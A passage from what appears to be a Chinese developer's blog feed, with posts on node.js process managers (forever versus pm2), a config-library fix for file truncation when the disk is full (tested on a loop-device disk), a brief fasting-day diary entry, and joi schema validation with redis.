另外一种情况是node.js出问题了CPU及内存100%占用，此时普通的kill杀不死（必须得kill -9），forever误认为已成功结束node.js进程，
然后拉起新的进程。
</p>
</li>

<li>未内置支持开机启动

<p>
可以直接放在crontab每分钟调用一次 <code>start.sh</code> 来实现，万一连forever进程都挂了，可以全部拉起来。
开机启动不内置则意味着一百个人有一百种做法，带来不必要的争议。
</p>
</li>

<li>允许程序同时启动多个实例

<p>
forever未对启动的程序进行唯一性标识，导致程序可能意外启动多个实例，多个实例之间往往相冲突，降低了系统可用性。
</p>

<p>
而由程序自已来实现单实例运行是很困难的，forever会不断地拉起退出的多余副本。
</p>
</li>

<li>未内置支持cluster以及优雅重启

<p>
部署代码重启程序过程中会停止服务几秒钟。
</p>
</li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><a href="https://github.com/Unitech/pm2">pm2</a></h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>安装

<div class="org-src-container">

<pre class="src src-js">npm install -g pm2
</pre>
</div>
</li>

<li>配置

<p>
以 <a href="https://github.com/tangxinfa/upload-fiddle">upload-fiddle</a> 项目为例。
</p>

<p>
统一配置其它脚本需要的环境变量
<code>.bashrc</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/pm2/bin:/usr/loc<span style="text-decoration: underline;">al/node/bin:$</span><span style="color: #f0c674; text-decoration: underline;">PATH</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_ENV</span>=${<span style="color: #f0c674;">NODE_ENV</span>:-production}
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_CONFIG_DIR</span>=<span style="color: #b294bb;">`pwd`</span>/config
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">APP_NAME</span>=<span style="color: #8abeb7;">"upload-fiddle"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">APP_SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js
</pre>
</div>

<p>
启动脚本
<code>start.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> -n <span style="color: #8abeb7;">"$APP_NAME"</span> start <span style="color: #8abeb7;">"$APP_SCRIPT"</span> -i 0 --watch <span style="color: #8abeb7;">"`pw</span><span style="color: #8abeb7; text-decoration: underline;">d`/src/*.js"</span>
</pre>
</div>

<p>
停止脚本
<code>stop.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> stop <span style="color: #8abeb7;">"$APP_NAME"</span>
</pre>
</div>

<p>
重启脚本
<code>restart.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> restart <span style="color: #8abeb7;">"$APP_NAME"</span>
</pre>
</div>
</li>

<li>用法

<p>
启动
</p>

<div class="org-src-container">

<pre class="src src-sh">./start.sh
</pre>
</div>

<p>
停止
</p>

<div class="org-src-container">

<pre class="src src-sh">./stop.sh
</pre>
</div>

<p>
重启
</p>

<div class="org-src-container">

<pre class="src src-sh">./restart.sh
</pre>
</div>
</li>

<li>缺点

<ul class="org-ul">
<li>程序退出过程中的日志无法捕获？

<p>
不一定。使用 <code>pm2 stop</code> 会有同样的问题，但是pm2支持优雅退出（ <code>pm2 gracefulReload</code> ），此时不但退出过程中的日志能够正常捕获，而且可以实现服务0停机时间。
</p>
</li>

<li>重启可能失败

<p>
是的。=pm2 restart= 并没有采用激进的措施（kill -9）确保旧进程结束。重现步骤：用gdb调试运行中的node进程（gdb node &lt;PID&gt;后不执行任何gdb命令），然后用pm2 restart重启服务，此时旧的进程杀不死，新的进程被创建。
</p>
</li>

<li>允许程序同时启动多个实例

<p>
pm2对启动的程序进行了唯一性标识，但是它将启动的信息保存在了当前用户的home目录下（~/.pm2），所以使用其它帐号时还是有能够启动多个程序实例，对于这一点forever也存在同样的问题。
</p>

<p>
对于服务器来说，多帐号是常态，应该默认防止这种问题发生。
</p>
</li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">程序写日志相关</h2>
<div class="outline-text-2" id="text-3">
<p>
用c/c++写日志的时候我一般都会使用日志库，如：<a href="http://logging.apache.org/log4cxx/index.html">log4cxx</a> 、<a href="https://github.com/HardySimpson/zlog">zlog</a> ，这些日志库容易使用而且很稳定，支持将日志写到文件或控制台，支持按大小、日期分割日志文件，支持限定日志文件数、占用空间。
</p>

<p>
但是node.js下最好的写日志方式其实是将日志直接输出到错误输出（stderr），由 <a href="https://github.com/nodejitsu/forever">forever</a> 、<a href="https://github.com/Unitech/pm2">pm2</a> 这样的后台服务监护工具来写日志文件。这是因为node.js做为一种动态语言，容易出现异常，特别是前期开发阶段，很多分支没有跑到，往往是写日志的语句出错，此时日志库是很难做到将异常时程序的调用堆栈写到日志文件中的，由台后服务监护工具来做能确保万无一失。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">参考</h2>
<div class="outline-text-2" id="text-4">
<ul class="org-ul">
<li>《<a href="http://se77en.cc/2013/06/27/goodbye-node-forever-hello-pm2-translation/">告别node-forever,拥抱PM2</a>》
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[config库避免磁盘满时配置文件被截断]]></title>
            <link>/article/config-5e93907f514d78c176d86ee165f6914d7f6e65874ef688ab622a65ad.html</link>
            <guid>/article/config-5e93907f514d78c176d86ee165f6914d7f6e65874ef688ab622a65ad.html</guid>
            <pubDate>Mon, 20 Jul 2015 09:35:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/tangxinfa/config">config</a> 库在实际使用过程中发现一个问题：磁盘满时写配置文件可能导致配置文件被清空（文件大小为0）。
</p>

<p>
想到两种方案：
</p>

<ul class="org-ul">
<li>写-替换

<p>
先写到一个临时文件，写成功后替换目标文件，这是由linux下重命名（rename）文件的原子性保证的。由于我们是通过对配置文件加锁的方式支持多进程访问的，可以对配置文件使用独立的锁文件，一想起到配置文件目录里将出现一大堆锁文件，胃就不舒服。
</p>
</li>

<li>预分配空间

<p>
先确保文件拥有足够的空间再写入。虽然不是原子性的，但已经能够解决问题。我比较倾向于这个方案。
</p>
</li>
</ul>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">通过预分配空间方式安全写文件算法</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>如果当前文件过小（不足以容纳新内容），在文件尾部通过追加占位字符（\0）直到文件大小合适
</li>

<li>写入新内容
</li>

<li>将过多的空间截掉
</li>
</ul>

<p>
具体实现参见： <a href="https://github.com/tangxinfa/config/commit/5ed686fc42c3356658d67d2d3bb59d3435f8c68f">5ed686f Fix bug: config file content missing when disk full</a> .
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">测试</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1">创建模拟磁盘目录 /mnt/disk</h3>
<div class="outline-text-3" id="text-2-1">
<p>
先确保存在 <code>/dev/loop*</code> 设备，如果不存在先尝试挂载 <code>loop</code> 内核模块
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo modprobe loop
</pre>
</div>

<p>
如果还是没有 <code>loop</code> 设备，可能是最近进行了系统升级，重启后再试。
</p>

<p>
创建模拟磁盘（/mnt/disk）：
</p>

<pre class="example">
$ sudo dd if=/dev/zero of=~/Examples/disk.img bs=8M count=1
$ sudo losetup /dev/loop0 ~/Examples/disk.img
$ sudo parted /dev/loop0
GNU Parted 3.2
Using /dev/loop0
Welcome to GNU Parted! Type 'help' to view a list of commands.
(parted) mklabel gpt
Warning: The existing disk label on /dev/loop0 will be destroyed and all data on
this disk will be lost. Do you want to continue?
Yes/No? yes
(parted) mkpart primary 0MB 8MB
Warning: The resulting partition is not properly aligned for best performance.
Ignore/Cancel? Ignore
(parted) print
Model: Loopback device (loopback)
Disk /dev/loop0: 8389kB
Sector size (logical/physical): 512B/512B
Partition Table: gpt
Disk Flags: 

Number  Start   End     Size    File system  Name  Flags
 1      17.4kB  8372kB  8354kB

(parted) quit
$ sudo mkfs.ext4 /dev/loop0p1
$ sudo mkdir /mnt/disk
$ sudo mount /dev/loop0p1 /mnt/disk
</pre>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2">修复前</h3>
<div class="outline-text-3" id="text-2-2">
<p>
磁盘空间不足写配置导致配置文件被损坏
</p>

<pre class="example">
$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
name: libconfig
$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.44769 s, 916 kB/s
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.53017 s, 906 kB/s
$ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
config: write: No space left on device
config: save config file(/mnt/disk/test.json) failed
data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
$ sudo ~/Opensource/config/config /mnt/disk/test.json get name
config: get items(name,,,,,) from config file(/mnt/disk/test.json) failed
</pre>
</div>
</div>

<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3">修复后</h3>
<div class="outline-text-3" id="text-2-3">
<p>
磁盘空间不足写配置不会对配置文件造成实质影响
</p>

<pre class="example">
$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
name: libconfig
$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.6254 s, 895 kB/s
$ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
config: write: No space left on device
config: save config file(/mnt/disk/test.json) failed
data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
$ sudo ~/Opensource/config/config /mnt/disk/test.json get name
name: libconfig
</pre>
</div>
</div>

<div id="outline-container-sec-2-4" class="outline-3">
<h3 id="sec-2-4">清除测试环境</h3>
<div class="outline-text-3" id="text-2-4">
<div class="org-src-container">

<pre class="src src-sh">sudo umount /dev/loop0p1
sudo losetup -d /dev/loop0
sudo rmdir /mnt/disk
sudo rm ~/Examples/disk.img
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">参考</h2>
<div class="outline-text-2" id="text-3">
<p>
《<a href="http://www.oschina.net/translate/reliable-file-updates-with-python">使用 Python 进行稳定可靠的文件操作</a>》</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[轻断食日（2015-7-17）]]></title>
            <link>/article/8f7b65ad98df65e5ff08-2015-7-17-ff09.html</link>
            <guid>/article/8f7b65ad98df65e5ff08-2015-7-17-ff09.html</guid>
            <pubDate>Fri, 17 Jul 2015 06:28:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天是轻断食日，昨天晚上10点多吃过水果后到现在还没有吃过东西，上午起得很晚，最近工作太累了。中午忘点餐干脆断食算了，下一顿要到18点的晚餐，已经泡好了下午茶，肚子有点撑（为什么不觉得很饿呢？），有时候又会觉得肚子有点饿得慌，但仔细一体会其实是最近因为工作有点焦虑。
</p>

<p>
现在是66.5公斤，主要是肚子瘦了些，继续加油。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用node.js的对象模式验证模块joi引入强类型]]></title>
            <link>/article/4f7f7528-node.js-76845bf98c616a215f0f9a8c8bc16a215757-joi-5f1551655f3a7c7b578b.html</link>
            <guid>/article/4f7f7528-node.js-76845bf98c616a215f0f9a8c8bc16a215757-joi-5f1551655f3a7c7b578b.html</guid>
            <pubDate>Mon, 13 Jul 2015 10:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>弱类型的Javascript

<p>
Javascript是一门弱类型的语言，定义变量不需要指定类型，可以为同一个变量赋任意类型的值。误用类型不会报错，而结果会让你大吃一惊：
</p>

<pre class="example">
&gt; "1" + 1
'11'
&gt; if ("false") { console.log("yes") } else { console.log("no"); }
yes
undefined
&gt;
</pre>

<p>
redis中很多数据结构取出时都是字符串值（如：set、hash），调用方需要自行将它转换成正确的类型（如：Boolean、Date、Number），如果不转换成正确的类型会导致冗长的代码，如Boolean类型：
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">if</span> ((String(model.stoped) == <span style="color: #8abeb7;">'true'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Do something when stoped.</span>
}
</pre>
</div>

<p>
如果手工转换成正确的类型肯定要写很多样板代码了。
</p>
</li>

<li>对象模式验证模块 <a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a>

<p>
有很多的ORM（ Object Relational Mapping 对象关系映射）库都能够实现强类型的数据模型，但是它们都相当的复杂，支持各种各样的数据库后端，支持一对一、一对多、多对多等数据关系，但是很少支持分表分库，我们的系统一般是数据模型简单但要考虑用户量大了横向扩展，所以一开始就进行了分表分库，无法使用重型的ORM。
</p>

<p>
如果有一个能够自动根据模式（Schema）定义对值进行类型转换的库，一定会非常有用。
</p>

<p>
<a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a> 一个Javascript对象模式描述语言以及验证（Object schema description language and validator for JavaScript objects）的库，它可以完成对象类型转换以及合法性验证。
</p>
</li>

<li><a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a> 的用法示例

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">joi</span> = require(<span style="color: #8abeb7;">'joi'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">redis</span> = require(<span style="color: #8abeb7;">'redis'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = redis.createClient(6379, <span style="color: #8abeb7;">'127.0.0.1'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">User</span> = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">options</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (! options) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   options = {};
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">this</span>.id = options.id || 0;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">this</span>.name = options.name || <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">this</span>.male = options.male || <span style="color: #81a2be;">true</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">this</span>.birthday = options.birthday;
};

User.schema = joi.object().keys({
<span style="background-color: #373b41;"> </span>   id: joi.number().integer().min(1),
<span style="background-color: #373b41;"> </span>   name: joi.string().required(),
<span style="background-color: #373b41;"> </span>   male: joi.<span style="color: #81a2be;">boolean</span>().<span style="color: #b5bd68;">default</span>(<span style="color: #81a2be;">true</span>),
<span style="background-color: #373b41;"> </span>   birthday: joi.date().required()
});

User.find = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">id</span>, <span style="color: #f0c674;">callback</span>) {
<span style="background-color: #373b41;"> </span>   client.hgetall(<span style="color: #8abeb7;">"user:"</span> + id, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">value</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (! value) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>(<span style="color: #8abeb7;">"User not found"</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   joi.validate(value, User.schema, callback);
<span style="background-color: #373b41;"> </span>   });
};

User.<span style="color: #81a2be;">prototype</span>.save = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">callback</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">value</span> = {};
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">fieldName</span> <span style="color: #b5bd68;">in</span> <span style="color: #81a2be;">this</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">typeof</span>(<span style="color: #81a2be;">this</span>[fieldName]) != <span style="color: #8abeb7;">'function'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   value[fieldName] = <span style="color: #81a2be;">this</span>[fieldName];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   joi.validate(value, User.schema, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">validatedValue</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   client.hmset(<span style="color: #8abeb7;">"user:"</span> + validatedValue.id, validatedValue, callback);
<span style="background-color: #373b41;"> </span>   });
};


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">user</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">User</span>({
<span style="background-color: #373b41;"> </span>   id: 1,
<span style="background-color: #373b41;"> </span>   name: <span style="color: #8abeb7;">"txf"</span>,
<span style="background-color: #373b41;"> </span>   male: <span style="color: #81a2be;">true</span>,
<span style="background-color: #373b41;"> </span>   birthday: <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Date</span>(<span style="color: #8abeb7;">"1983-03-22"</span>)
});

user.save(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.error(<span style="color: #8abeb7;">"user save error("</span> + err.toString() + <span style="color: #8abeb7;">")"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   client.quit();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   console.info(<span style="color: #8abeb7;">"user saved"</span>);

<span style="background-color: #373b41;"> </span>   User.find(user.id, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">user</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   client.quit();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.error(<span style="color: #8abeb7;">"user find error("</span> + err.toString() + <span style="color: #8abeb7;">")"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.log(<span style="color: #8abeb7;">"user found: "</span> + JSON.stringify(user));
<span style="background-color: #373b41;"> </span>   });
});
</pre>
</div>

<p>
运行结果：
</p>

<div class="org-src-container">

<pre class="src src-js">user saved
